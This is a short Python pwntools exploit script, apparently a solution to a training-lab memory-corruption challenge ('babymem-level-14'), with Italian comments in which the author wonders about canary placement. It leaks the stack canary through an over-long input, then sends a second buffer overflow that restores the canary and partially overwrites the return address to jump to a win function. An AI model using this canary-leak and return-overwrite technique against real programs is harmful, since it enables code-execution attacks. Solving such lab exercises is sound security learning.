from pwn import * 

elf = ELF("/challenge/babymem-level-14-0")
io = elf.process()

b_offset = int("158", 16)
b_size = 328
win_func = b"\xcc" + b"\x1f"
canary_offset = 56 + 1          # Ha sempre uno \x00 alla fine?

k = b"REPEAT"

p1 = k + b'A'*(canary_offset - len(k))

# La canary rimane in mezzo allo stack perché reasons?
#       Ok, ma come l'avrei capito senza stack dump?


io.sendline(f"{len(p1)}")
io.sendline(p1)

io.recvuntil(p1)
can_val = io.recvuntil("\n")
can_val = b"\x00" + can_val[:7]

p2 = b"A"*(b_offset - 16) + can_val + b"B"*8 + win_func

io.sendline(f"{len(p2)}")
io.sendline(p2)

io.interactive()
